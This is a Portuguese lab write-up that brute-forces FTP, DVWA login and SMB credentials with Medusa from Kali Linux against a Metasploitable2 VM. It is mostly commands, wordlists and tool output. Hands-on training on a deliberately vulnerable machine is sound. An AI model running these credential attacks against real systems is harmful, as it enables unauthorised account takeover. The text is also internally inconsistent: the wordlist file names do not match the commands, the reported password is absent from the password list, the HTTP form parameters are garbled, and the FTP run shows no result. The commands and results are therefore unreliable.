# LISTA-SIMULANDO-UM-ATAQUE-DE-BRUTE-FORCE-DE-SENHAS-COM-MEDUSA-E-KALI-LINUX

Laboratório de Segurança - Simulação de Ataque de Brute Force com Medusa e Kali Linux
🎯 Objetivo
Simular um ataque de força bruta em serviços FTP, HTTP e SMB utilizando a ferramenta Medusa no Kali Linux contra uma máquina virtual Metasploitable2.
🖥️ Ambiente de Teste
Máquina Atacante
Sistema: Kali Linux
Ferramenta: Medusa v2.3
Máquina Alvo (Vítima)
Sistema: Metasploitable2
IP: 192.168.56.101
Ambiente: VirtualBox
🔍 Reconhecimento Inicial
Teste de Conectividade
bash
Plain Text
┌──(kali㉿kali)-[~]└─$ ping -c 2 192.168.56.101
PING 192.168.56.101 (192.168.56.101) 56(84) bytes de dados.64 bytes de 192.168.56.101: icmp_seq=1 ttl=64 tempo=57,4 ms64 bytes de 192.168.56.101: icmp_seq=2 ttl=64 tempo=1,43 ms
--- Estatísticas de ping 192.168.56.101 ---2 pacotes transmitidos, 2 recebidos, 0% de perda de pacotes, tempo 1003 ms
rtt min/média/máx/desvio padrão = 1,425/29,396/57,368/27,971 ms


Varredura de Portas e Serviços
bash
Plain Text
┌──(kali㉿kali)-[~]└─$ nmap -sV -p 21,22,80,445,139 192.168.56.101
Resultado do Nmap:
 
Porta	Estado	Serviço	Versão
21/tcp	aberto	ftp	vsftpd 2.3.4
22/tcp	aberto	ssh	OpenSSH 4.7p1 Debian 8ubuntu1
80/tcp	aberto	http	Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp	aberto	netbios-ssn	Samba smbd 3.X - 4.X
445/tcp	aberto	netbios-ssn	Samba smbd 3.X - 4.X
Grupo de trabalho: WORKGROUP
⚔️ Ataque de Força Bruta - FTP
Teste Manual de Login FTP
bash
Plain Text
┌──(kali㉿kali)-[~]└─$ ftp 192.168.56.101
Conectado a 192.168.56.101.220 (vsFTPd 2.3.4)Nome (192.168.56.101:kali): admin331 Por favor, especifique a senha.
Senha: 530 Login incorreto.
ftp: Login falhou
ftp> quit221 Adeus.


Preparação de Listas de Credenciais
bash
Plain Text
┌──(kali㉿kali)-[~]└─$ echo -e 'usuário\nmsfadmin\nadmin\nroot' > usuários.txt
┌──(kali㉿kali)-[~]└─$ echo -e '123456\nsenha\nqwerty\nmsfadmin' > pass.txt


Ataque com Medusa - FTP
bash
Plain Text
┌──(kali㉿kali)-[~]└─$ medusa -h 192.168.56.101 -u users.txt -p pass.txt -M ftp -t 6
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks jmk@foofus.net
2025-10-12 19:55:38 VERIFICAÇÃO DE CONTA: [ftp] Host: 192.168.56.101 (1 de 1, 0 concluído) 
Usuário: users.txt (1 de 1, 0 concluído) 
Senha: pass.txt (1 de 1 concluído)


🌐 Ataque de Força Bruta - HTTP (DVWA)
Identificação do Alvo
Endereço DVWA: http://192.168.56.101/dvwa/login.php
Preparação de Listas
bash
Plain Text
┌──(kali㉿kali)-[~]└─$ echo -e 'user\nadmin\nmsfadmin\nadmin\nroot' > users.txt
┌──(kali㉿kali)-[~]└─$ echo -e 'usuário\nmsfadmin\nadmin\nroot' > usuários.txt


Ataque com Medusa - HTTP
bash
Plain Text
┌──(kali㉿kali)-[~]└─$ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \-m PAGE:'/dvwa/login.php' \-m FORM:'username-^USER^bpassord-^PASS^blogin-login' \-m 'FAIL-Login falhou' -t 6
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks jmk@foofus.net
2025-10-12 23:02:15 VERIFICAÇÃO DE CONTA: [http] Host: 192.168.56.101 (1 de 1, 0 concluído) 
Usuário: admin (1 de 4, 0 concluído) Senha: password (1 de 4 concluído)2025-10-12 23:02:15 CONTA ENCONTRADA: [http] Host: 192.168.56.101 Usuário: admin Senha: password [SUCESSO]2025-10-12 23:02:15 VERIFICAÇÃO DE CONTA: [http] Host: 192.168.56.101 (1 de 1, 0 concluído) 
Usuário: msfadmin (2 de 4, 1 concluído) Senha: password (1 de 4 concluído)2025-10-12 23:02:15 CONTA ENCONTRADA: [http] Host: 192.168.56.101 Usuário: msfadmin Senha: password [SUCESSO]2025-10-12 23:02:15 VERIFICAÇÃO DE CONTA: [http] Host: 192.168.56.101 (1 de 1, 0 concluído) 
Usuário: user (3 de 4, 2 concluídos) Senha: password (1 de 4 concluídos)2025-10-12 23:02:15 CONTA ENCONTRADA: [http] Host: 192.168.56.101 Usuário: user Senha: password [SUCESSO]2025-10-12 23:02:15 VERIFICAÇÃO DE CONTA: [http] Host: 192.168.56.101 (1 de 1, 0 concluído) 
Usuário: root (4 de 4, 3 concluídos) Senha: password (1 de 4 concluídos)2025-10-12 23:02:15 CONTA ENCONTRADA: [http] Host: 192.168.56.101 Usuário: root Senha: password [SUCESSO]


💻 Ataque de Força Bruta - SMB
Enumeração com Enum4linux
bash
Plain Text
┌──(kali㉿kali)-[~]└─$ enum4linux -a 192.168.56.101 | tee enum4_output.txt
Principais Descobertas:
Domínio/Grupo de trabalho: WORKGROUP
Nome do servidor: METASPLOITABLE
Samba: 3.0.20-Debian
Compartilhamentos Encontrados:
print$ - Printer Drivers
tmp - oh noes!
opt -
IPC$ - IPC Service
ADMIN$ - IPC Service
Política de Senhas:
Comprimento mínimo: 5 caracteres
Histórico de senhas: Nenhum
Idade máxima da senha: Não definida
Complexidade: Desativada
Preparação de Listas SMB
bash
Plain Text
┌──(kali㉿kali)-[~]└─$ echo -e 'usuário\nmsfadmin\nserviço' > smb_users.txt
┌──(kali㉿kali)-[~]└─$ echo -e 'senha\n123456\nwelcome123\nmsfadmin' > senhas_spray.txt


Ataque com Medusa - SMB
bash
Plain Text
┌──(kali㉿kali)-[~]└─$ medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks jmk@foofus.net
2025-10-13 00:11:44 CONTA ENCONTRADA: [smbnt] Host: 192.168.56.101 
Usuário: msfadmin Senha: msfadmin [SUCESSO (ADMIN$ - Acesso permitido)]


✅ Validação de Acesso
Teste de Conexão SMB
bash
Plain Text
┌──(kali㉿kali)-[~]└─$ smbclient -L //192.168.56.101 -U msfadmin
Senha para [WORKGROUP\msfadmin]:
Compartilhamentos Acessíveis:
text
Plain Text
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk      
IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
msfadmin        Disk      Home Directories


📊 Resumo dos Resultados
Credenciais Comprometidas
 
Serviço	Usuário	Senha	Status
HTTP	admin	password	✅ Sucesso
HTTP	msfadmin	password	✅ Sucesso
HTTP	user	password	✅ Sucesso
HTTP	root	password	✅ Sucesso
SMB	msfadmin	msfadmin	✅ Sucesso
Serviços Vulneráveis Identificados
FTP (vsftpd 2.3.4) - Vulnerável a brute force
HTTP (Apache 2.2.8) - DVWA vulnerável a ataques de autenticação
SMB (Samba 3.0.20) - Política de senhas fracas


